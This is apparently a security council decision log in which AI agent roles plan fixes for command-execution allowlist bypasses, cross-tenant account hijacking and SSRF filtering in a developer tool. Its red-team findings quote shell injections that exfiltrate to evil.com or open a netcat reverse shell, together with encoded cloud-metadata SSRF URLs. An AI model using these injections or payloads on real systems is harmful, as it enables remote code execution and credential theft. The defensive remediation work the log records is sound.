# BRAHMASTRA Security Council — Decision Log (Cycle 3)

**Session Date:** 2026-11-11
**Convened by:** Antigravity (Agent 0 — Orchestrator)
**Roles Participating:**
1. Security Orchestrator (Antigravity Agent 0)
2. Threat Model Analyst
3. Defensive Code Auditor
4. Red-Team Agent
5. Remediation Architect
6. Test Engineer
7. Independent Verification Agent

---

## 1. Context & Motivation

Following the Cycle 2 Pre-Commit Release Gate review (`docs/security/cycle2-release-review.md`), the release was BLOCKED. The independent adversarial auditor confirmed that while `BRAH-SEC-002` (macOS Keychain) and `BRAH-SEC-004` (Pytest flag injection) were verified fixed, critical vulnerabilities remained in:
1. `BRAH-SEC-003` (Command execution architecture: command substitution, newlines, and prefix matching bypasses under `--yes`).
2. `BRAH-SEC-001` (Tenant authorization: unauthorized account attachment and global enumeration).
3. `BRAH-SEC-005` (SSRF: integer/hex IP encodings, DNS wildcard aliases, IPv6 IMDS, and private network scanning).

---

## 2. Adversarial Council Deliberations

### Finding 1: P0 — BRAH-SEC-003 (Command Execution Policy Architecture)
- **Threat Model Analyst:** The root flaw is syntactic vs semantic evaluation. A raw `startswith` string match cannot evaluate shell commands safely because POSIX shells evaluate `$()`, backticks, newlines, redirects, and pipes before executing the command.
- **Red-Team Agent:** We demonstrated that `ls $(curl http://evil.com/exfil)` or `git diff $(nc -e /bin/sh 10.0.0.1 4444)` evaluates to `SAFE_READ`. Under `--yes`, this results in unprompted arbitrary remote code execution.
- **Remediation Architect Proposal:**
  1. Ban all shell metacharacters (`$`, ``` ` ```, `\n`, `\r`, `>`, `<`, `|`, `&`, `;`, `(`, `)`, `{`, `}`, `!`) from `SAFE_READ`.
  2. Parse commands with `shlex.split`.
  3. Enforce exact executable token allowlist (first token must be in `{"ls", "git", "pwd", "whoami"}`).
  4. For `git`, whitelist subcommands strictly (`status`, `diff`, `log`, `branch`).
  5. For all file arguments, resolve canonical paths and enforce repository boundary and sensitive target pattern checks.
- **Defensive Code Auditor:** Agreed. The policy must fail closed if `shlex.split` fails (e.g. malformed or unclosed quotes).
- **Test Engineer:** We will write failing regression tests for `ls $(id)`, ``ls `id` ``, `ls\ncurl ...`, `git status $(uname -a)`, `lsof -i`, and path traversal.

### Finding 2: P1 — BRAH-SEC-001 (Tenant Authorization & Account Attachment)
- **Threat Model Analyst:** `assign_account_to_organization` lacked ownership verification. An account created by Tenant A could be attached by Tenant B to Tenant B's organization, granting Tenant B rotation and revocation rights. Furthermore, `list_provider_accounts` leaked all account names globally when unscoped.
- **Red-Team Agent:** Demonstrated that by knowing an account name (`alpha-acc`), an adversary in `org-bravo` could invoke `assign_account_to_organization("alpha-acc", "org-bravo")` and bypass `_verify_account_organization_scoping`.
- **Remediation Architect Proposal:**
  1. Enforce strict single-tenant ownership: if an account is already assigned to an organization, attempting to assign it to a different organization must raise `PermissionError` unless explicit administrative transfer authorization is implemented.
  2. In `list_provider_accounts`, resolve active organization context. If active org is set, return only accounts assigned to that org. If unscoped, return ONLY unassigned local developer accounts (`where(OrganizationAssignmentModel.id.is_(None))`).
- **Defensive Code Auditor:** Enforcing single-tenant account ownership matches enterprise security boundaries and completely closes the account hijacking vector.
- **Test Engineer:** We will write failing regression tests verifying that cross-tenant assignment is blocked, and unscoped `list_provider_accounts` excludes org-assigned accounts.

### Finding 3: P1 — BRAH-SEC-005 (SSRF & Endpoint Canonicalization)
- **Threat Model Analyst:** String-matching URLs fails because IP addresses have multiple valid representations (integer, hex, octal, IPv6-mapped IPv4, DNS wildcards like `nip.io`).
- **Red-Team Agent:** Demonstrated that `http://2852039166:80`, `http://0xa9fea9fe:80`, `http://169.254.169.254.nip.io:80`, and `http://[fd00:ec2::254]:80` bypassed the 3-string blacklist.
- **Remediation Architect Proposal:**
  1. Parse URL using `urllib.parse.urlsplit`.
  2. Enforce scheme `http` or `https`.
  3. Resolve hostname using `socket.getaddrinfo`.
  4. Parse resolved IP with Python `ipaddress.ip_address`.
  5. Unpack IPv4-mapped IPv6 addresses (`ip.ipv4_mapped`).
  6. Reject link-local (`169.254.0.0/16`, `fe80::/10`), private RFC 1918/RFC 4193 (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `fc00::/7`), multicast, reserved, and AWS IPv6 metadata (`fd00:ec2::254`).
  7. Permit only loopback addresses (`127.0.0.0/8`, `::1`) by default for local Ollama.
  8. Disable HTTP redirects (`follow_redirects=False`) in `httpx.Client`.
- **Defensive Code Auditor:** This provides defense-in-depth against DNS rebinding, alternative encodings, and internal network scanning.

---

## 3. Consensus & Decision

The Council unanimously approved the Cycle 3 remediation plan. Implementation will proceed sequentially:
1. **Step 1:** Implement BRAH-SEC-003 (Command Policy Architecture).
2. **Step 2:** Implement BRAH-SEC-001 (Tenant Authorization & Scoping).
3. **Step 3:** Implement BRAH-SEC-005 (SSRF IP Canonicalization).
